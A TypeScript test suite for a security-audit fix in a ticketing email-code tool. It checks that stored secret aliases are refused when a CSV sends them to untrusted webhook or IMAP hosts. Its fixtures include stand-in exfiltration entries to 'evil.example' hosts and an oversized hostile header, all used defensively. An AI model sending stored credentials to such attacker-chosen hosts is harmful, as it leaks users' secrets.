import { describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { ResolverRegistry, registerBuiltinResolvers } from "../src/application/resolvers/resolver-registry.js";
import { registerImapResolver } from "../src/application/resolvers/imap-resolver.js";
import { ParserRegistry } from "../src/application/parsers/parser-registry.js";
import { registerBuiltinParsers } from "../src/application/parsers/builtin-parsers.js";
import type { ImapClientLike } from "../src/application/email/imap-flow-transport.js";

/**
 * SEC-1 (security audit 2026-11-19): a stored secret (`@alias`) must not be
 * sent to a destination chosen by a — possibly third-party — CSV.
 */

const aliases = {
  get: (k: string) => ({ gmailpw: "app-pass-secret", tok: "tok-secret" } as Record<string, string>)[k] ?? null,
} as never;
const TM = { email: "fan@example.com", siteKind: "ticketmaster" as const, field: "emailcode" };

function setup(trusted: string[] = []) {
  const seen: { host: string; pass: string }[] = [];
  const factory = (c: { host: string; pass: string }): ImapClientLike => {
    seen.push({ host: c.host, pass: c.pass });
    return {
      async connect() {},
      async getMailboxLock() { return { release() {} }; },
      async search() { return []; },
      async fetchOne() { return false; },
      async logout() {},
    };
  };
  const parsers = new ParserRegistry(fs.mkdtempSync(path.join(os.tmpdir(), "qp-sec1-")));
  registerBuiltinParsers(parsers);
  const reg = new ResolverRegistry();
  registerBuiltinResolvers(reg);
  registerImapResolver(reg, {
    parsers,
    imapClientFactory: factory as never,
    trustedHosts: () => trusted,
  });
  return { reg, seen };
}

describe("SEC-1: stored secrets only go to trusted destinations", () => {
  it("webhook refuses any @alias — the URL comes from the CSV", async () => {
    let called = false;
    const f = (async () => { called = true; return new Response("{}"); }) as typeof fetch;
    const v = await setup().reg.resolve("webhook:https://evil.example/collect?k=@tok", { fetch: f }, aliases);
    expect(v).toMatch(/^#BAD ALIAS stored secrets are never sent to a webhook URL/);
    expect(called).toBe(false);
  });

  it("an unknown alias name is not a secret and does not trip the guard", async () => {
    const f = (async () => new Response(JSON.stringify({ code: "1" }))) as typeof fetch;
    expect(await setup().reg.resolve("webhook:https://ok.example/x?n=@nosuch", { fetch: f }, aliases)).toBe("1");
  });

  it("imap: an @alias password is refused for an unknown host, never sent", async () => {
    const { reg, seen } = setup();
    const v = await reg.resolve("imap:evil.example.com:993:me@gmail.com:@gmailpw:ticketmaster", TM, aliases);
    expect(v).toMatch(/^#BAD ALIAS @gmailpw is only sent to known mail hosts/);
    expect(seen).toEqual([]);
  });

  it("imap: well-known providers, loopback (AYCD IMAP Server) and stored-account hosts are trusted", async () => {
    const { reg, seen } = setup(["mail.mydomain.com"]);
    for (const host of ["imap.gmail.com", "127.0.0.1", "mail.mydomain.com"]) {
      await reg.resolve(`imap:${host}:993:me@x.com:@gmailpw:ticketmaster`, TM, aliases);
    }
    expect(seen.map((s) => s.host)).toEqual(["imap.gmail.com", "127.0.0.1", "mail.mydomain.com"]);
    expect(seen.every((s) => s.pass === "app-pass-secret")).toBe(true);
  });

  it("imap: an inline (non-alias) password is the CSV author's own business — allowed", async () => {
    const { reg, seen } = setup();
    await reg.resolve("imap:mail.other.example:993:u:plainpw:ticketmaster", TM, aliases);
    expect(seen).toEqual([{ host: "mail.other.example", pass: "plainpw" }]);
  });

  it("legacy imap:// form is guarded too", async () => {
    const { reg } = setup();
    const v = await reg.resolve("imap://evil.example.com:993?user=me&pass=@gmailpw", TM, aliases);
    expect(v).toMatch(/^#BAD ALIAS/);
  });
});

describe("SEC-1 audit follow-ups", () => {
  it("imap: an @alias password to a remote host must use TLS (993); loopback is exempt", async () => {
    const { reg, seen } = setup();
    expect(await reg.resolve("imap:imap.gmail.com:143:me@x.com:@gmailpw:ticketmaster", TM, aliases)).toMatch(
      /only sent over TLS/,
    );
    await reg.resolve("imap:127.0.0.1:1143:me@x.com:@gmailpw:ticketmaster", TM, aliases);
    expect(seen.map((s) => s.host)).toEqual(["127.0.0.1"]);
  });

  it("the .jyl address helper stays fast on a hostile header", async () => {
    const { loadJylParsers } = await import("../src/application/parsers/jyl-parser-loader.js");
    const { parsers } = loadJylParsers(
      `<jyl><email-parser name="a"><can-run>return true</can-run><get-query>return ""</get-query>
       <parse-message>return msg.from.value.length + ":" + (msg.from.value[0] ? msg.from.value[0].address : "")</parse-message></email-parser></jyl>`,
      "a.jyl",
    );
    const hostile = '"' + "a".repeat(200_000);
    const t = Date.now();
    const out = parsers[0]!.parseMessage({ from: hostile, to: "", subject: "", text: "", html: "", body: "", id: "x", date: null }, {} as never);
    expect(Date.now() - t).toBeLessThan(200);
    expect(out).toBe("0:");
    expect(parsers[0]!.parseMessage({ from: 'Ticketmaster <tm@x.com>, b@y.com', to: "", subject: "", text: "", html: "", body: "", id: "x", date: null }, {} as never)).toBe("2:tm@x.com");
  });
});
